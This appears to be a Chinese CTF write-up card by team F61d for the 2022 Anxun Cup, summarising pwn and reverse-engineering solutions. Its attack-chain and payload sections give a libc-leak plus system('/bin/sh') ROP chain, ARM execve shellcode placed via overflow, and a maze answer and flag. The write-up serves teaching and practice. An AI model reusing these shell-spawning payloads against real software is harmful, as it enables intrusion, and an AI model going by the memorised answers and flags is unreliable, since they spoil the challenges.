---
title: "第五届安洵杯\"网络安全挑战赛WriteUp By F61d"
category: pwn
tags: ["安洵杯", "pwn", "PWN-BF逆向", "PWN-ARM-QEMU", "RE-RC4", "RE-VM保护"]
signals: ["安洵杯 2022", "PWN-BF逆向", "PWN-ARM-QEMU", "RE-RC4", "RE-VM保护", "Z3求解", "RE-迷宫", "Web-Babyphp", "rce", "F61d", "PWN", "Web", "Babybf", "libc"]
difficulty: medium
source: "https://www.ctfiot.com/81036.html"
tools: ["ARM", "Radare2", "Z3"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 第五届安洵杯"网络安全挑战赛WriteUp By F61d

> 赛事：安洵杯 2022 | 方向：pwn | 难度：medium | 工具：ARM、Radare2、Z3

## 一句话总结

F61d战队第二名WP,2道PWN+4道RE+Web:Babybf(BF指令越界读libc+越界写system)+Babyarm(ARM QEMU shellcode)+Reee(花指令+RC4)+re1(VM虚拟机保护+z3约束)+re2(虚假RC4+迷宫75步斜线移动)

## 攻击链

1. Babybf: 逆向BF指令p8(0x3e)+p8(0x2e)+p8(0x2d)→越界读泄libc-231-__libc_start_main+越界写ret+pop_rdi+system(/bin/sh)|Babyarm: ARM架构QEMU base64换表+BSS段写shellcode add r0,pc#12 mov r1,0 mov r2,0 mov r7,11 svc 0|Reee: sub_401640→loc_4011B0有花指令→e8 patch掉→sub_401050+sub_401130为RC4加密→直接解密|re1: 虚拟机保护(VM)→指针函数循环模拟指令→打印伪汇编→z3约束求解(0xF1/0xF2/0xF5/0xF6/0xF8/0xF9指令)|re2: 改输入的RC4+虚假flag→sub_402A80 off_40665C→sub_402780→loc_4027F0花指令→3f patch f5→75步迷宫(初始(2,2)+斜线移动)

## 关键 payload

```
cmd(p8(0x3e)*0x58+(p8(0x2e)+p8(0x3e))*8+p8(0x2d)*8)|sla('msg>','s1mpl3Dec0d4r') payload='a'*0x28+p32(elf.bss()+0x3c)+p32(0x10c00) shellcode add r0,pc,#12 mov r1,#0 mov r2,#0 mov r7,#11 svc 0 .ascii "/bin/sh\0"|z3 BitVec x[i] dest[64+i]==data[i]|dssaaasasssdsddddwddssasaaassdsssaasssddssasaassaaassdsdsssaaassddddsdssasa|flag{Ju$t_e@sy_vM}
```

## 经验教训

1) BF(BrainFuck)类VM用p8(0x3e=+)、p8(0x2e=.)、p8(0x2c=,)、p8(0x2d=-)对应[]<>+-等指令; 2) ARM架构QEMU启动NX+PIE实际无效,bss+0x3c=ret_addr可执行shellcode; 3) VM保护程序反编译识别指针函数循环模拟指令,需先打印伪汇编再z3约束; 4) 迷宫题关键:识别初始位置(2,2)+斜线移动(w/a/s/d对应↖↙↗↘)+75步; 5) 花指令patch:e8(call)→90(nop)或3f→f5; 6) ARM svc 0=Linux系统调用,mov r7,#11=execve,add r0,pc,#12="/bin/sh\0"位置

## 标签

PWN-BF逆向、PWN-ARM-QEMU、RE-RC4、RE-VM保护、Z3求解、RE-迷宫、Web-Babyphp

## 参考来源

- https://www.ctfiot.com/81036.html
- 原文件：第五届安洵杯”网络安全挑战赛WriteUp_By_F61d.full.md
